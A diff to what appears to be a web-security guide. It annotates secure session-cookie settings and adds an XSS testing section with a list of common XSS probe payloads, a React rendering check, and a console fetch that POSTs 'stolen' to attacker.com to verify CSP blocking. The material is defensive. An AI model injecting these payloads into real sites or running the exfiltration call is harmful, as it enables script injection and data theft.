@@ -62,8 +62,33 @@ To mitigate the impact of XSS, ensure that session cookies are flagged as `HttpO
 ```javascript
 // Express.js Example
 res.cookie('session_id', 'xyz123', {
-  httpOnly: true, // Crucial
+  httpOnly: true, // Crucial: prevents JS from reading
   secure: true,   // Send only over HTTPS
-  sameSite: 'strict'
+  sameSite: 'strict' // Prevent CSRF via cookies
 });
+```
+
+## 5. Testing for XSS
+
+```javascript
+// Common XSS payloads to test with
+const xssPayloads = [
+  '<script>alert(1)</script>',
+  '<img src=x onerror=alert(1)>',
+  '<svg onload=alert(1)>',
+  'javascript:alert(1)',
+  '<iframe src="javascript:alert(1)">',
+  '<body onload=alert(1)>'
+];
+
+// In React:
+xssPayloads.forEach(payload => {
+  // If React safely escapes, nothing should execute
+  const { rerender } = render(<div>{payload}</div>);
+  // ✓ If you don't see an alert, React protected you
+});
+
+// Browser console to verify CSP
+fetch('http://attacker.com', { method: 'POST', body: 'stolen' });
+// Should be blocked by CSP if script-src doesn't include attacker.com
 ```
